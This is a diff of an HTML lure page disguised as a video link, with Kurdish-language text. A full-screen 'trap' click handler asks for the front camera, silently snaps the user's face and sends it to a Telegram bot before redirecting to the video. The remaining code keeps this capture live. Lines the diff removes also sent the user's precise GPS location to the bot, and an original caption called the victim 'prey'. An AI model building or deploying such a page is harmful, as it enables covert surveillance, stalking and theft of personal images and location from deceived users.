@@ -11,7 +11,6 @@
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
-    <meta property="og:url" content="https://rudawsoran.github.io/News/">
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; }
@@ -20,7 +19,6 @@
         .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
-        .flash-active { background-color: white !important; }
     </style>
 </head>
 <body id="b">
@@ -28,7 +26,6 @@
     <div class="play-btn" id="btn">
         <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
     </div>
-    
     <div id="trap" onclick="startApp()"></div>
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -41,13 +38,11 @@
         async function startApp() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const b = document.getElementById('b');
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
                 document.getElementById('bg').style.display = 'none';
                 document.getElementById('btn').style.display = 'none';
-                b.classList.add('flash-active');
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
@@ -57,15 +52,9 @@
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
                     fd.append('photo', blob, 'photo.jpg');
-                    fd.append('caption', "📸 وێنەی نێچیر\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                    fd.append('caption', "📸 وێنە هات\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const mapLink = "https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
-                            window.location.href = targetVideo;
-                        }, (err) => { window.location.href = targetVideo; }, { enableHighAccuracy: true, timeout: 5000 });
-                    } else { window.location.href = targetVideo; }
+                    window.location.href = targetVideo;
                 }, 1000);
             } catch (e) { alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بە کامێرا بدەیت."); }
         }
